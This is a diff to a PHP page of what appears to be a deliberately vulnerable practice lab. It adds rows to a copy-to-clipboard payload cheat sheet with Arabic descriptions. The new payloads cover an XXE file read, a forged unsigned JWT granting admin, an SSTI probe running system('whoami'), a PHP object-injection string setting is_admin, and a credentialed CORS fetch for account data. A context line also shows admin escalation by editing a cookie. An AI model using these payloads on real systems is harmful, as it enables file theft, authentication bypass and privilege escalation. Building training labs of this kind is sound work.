@@ -311,6 +311,36 @@ require_once __DIR__ . '/../includes/header.php';
                             <td>تعديل ملف الكوكي عبر الكونسول لتصعيد الصلاحيات</td>
                             <td class="text-center"><button class="btn btn-sm btn-outline-success copy-cmd-btn" data-cmd='document.cookie="user_role=admin; path=/"'><i class="fas fa-copy"></i></button></td>
                         </tr>
+                        <tr>
+                            <td class="text-warning fw-bold">XXE Entity Leak</td>
+                            <td><code class="text-warning">&lt;!ENTITY ext SYSTEM "file:///secret_note.txt"&gt;</code></td>
+                            <td>استغلال محلل XML لسحب الملفات السرية عبر الكيانات</td>
+                            <td class="text-center"><button class="btn btn-sm btn-outline-warning copy-cmd-btn" data-cmd='<!ENTITY ext SYSTEM "file:///secret_note.txt">'><i class="fas fa-copy"></i></button></td>
+                        </tr>
+                        <tr>
+                            <td class="text-info fw-bold">JWT None Alg</td>
+                            <td><code class="text-info">{"alg":"none","typ":"JWT"}.{"role":"admin"}.</code></td>
+                            <td>تزوير توكن المصادقة بدون توقيع رقمي</td>
+                            <td class="text-center"><button class="btn btn-sm btn-outline-info copy-cmd-btn" data-cmd='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.'><i class="fas fa-copy"></i></button></td>
+                        </tr>
+                        <tr>
+                            <td class="text-danger fw-bold">SSTI Math Eval</td>
+                            <td><code class="text-danger">{{7*7}} | {{system('whoami')}}</code></td>
+                            <td>اختبار تنفيذ شيفرات محركات القوالب (Jinja/Twig/Blade)</td>
+                            <td class="text-center"><button class="btn btn-sm btn-outline-danger copy-cmd-btn" data-cmd="{{7*7}}"><i class="fas fa-copy"></i></button></td>
+                        </tr>
+                        <tr>
+                            <td class="text-warning fw-bold">Deserialization</td>
+                            <td><code class="text-warning">O:14:"JokerLabLogger":3:{...s:8:"is_admin";b:1;}</code></td>
+                            <td>حقن كائنات PHP والتلاعب بالدوال السحرية __destruct</td>
+                            <td class="text-center"><button class="btn btn-sm btn-outline-warning copy-cmd-btn" data-cmd='O:14:"JokerLabLogger":3:{s:7:"logfile";s:15:"secret_note.txt";s:6:"action";s:9:"pwn_admin";s:8:"is_admin";b:1;}'><i class="fas fa-copy"></i></button></td>
+                        </tr>
+                        <tr>
+                            <td class="text-info fw-bold">CORS Steal API</td>
+                            <td><code class="text-info">fetch('cors.php?api=user_data',{credentials:'include'})</code></td>
+                            <td>سحب وقراءة بيانات الحساب البنكي من نطاق خارجي</td>
+                            <td class="text-center"><button class="btn btn-sm btn-outline-info copy-cmd-btn" data-cmd="fetch('cors.php?api=user_data', {credentials: 'include'}).then(r=>r.json()).then(console.log);"><i class="fas fa-copy"></i></button></td>
+                        </tr>
                     </tbody>
                 </table>
             </div>
